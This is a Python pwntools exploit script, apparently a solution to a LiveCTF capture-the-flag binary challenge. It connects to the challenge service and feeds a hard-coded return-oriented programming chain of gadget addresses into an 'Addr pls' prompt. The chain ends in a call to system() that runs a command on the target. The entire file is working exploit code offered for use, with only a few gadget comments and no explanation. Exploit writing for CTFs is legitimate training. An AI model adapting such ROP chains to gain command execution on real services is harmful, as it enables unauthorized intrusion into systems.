#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
#io = process("../handout/challenge")

POP_RDI_RBP = 402218  # pop rdi; pop rbp; ret
POP_RBX_R12_R13_RBP = 404807
MOV_RAX_R12 = 469407  # mov rax, r12; pop rbx; pop r12; pop rbp; ret
ADD_RAX_RDI = 471885
MOV_RDI_RAX_SYSTEM  = 401914  # mov rdi, rax; system
RET = 429667

ROP_CHAIN = [
    42,
    42,
    42,
    400000000,  # set `i`
    POP_RBX_R12_R13_RBP,
    42,
    490499,
    42,
    42,
    MOV_RAX_R12,
    42,
    42,
    42,
    POP_RDI_RBP,
    10060,
    42,
    ADD_RAX_RDI,
    RET,  # stack alignment
    MOV_RDI_RAX_SYSTEM,
    0x0,
]

for entry in ROP_CHAIN:
    io.sendlineafter("Addr pls: ", str(entry))

io.sendline("/home/livectf/submitter")
print(io.recvall())
#io.interactive()
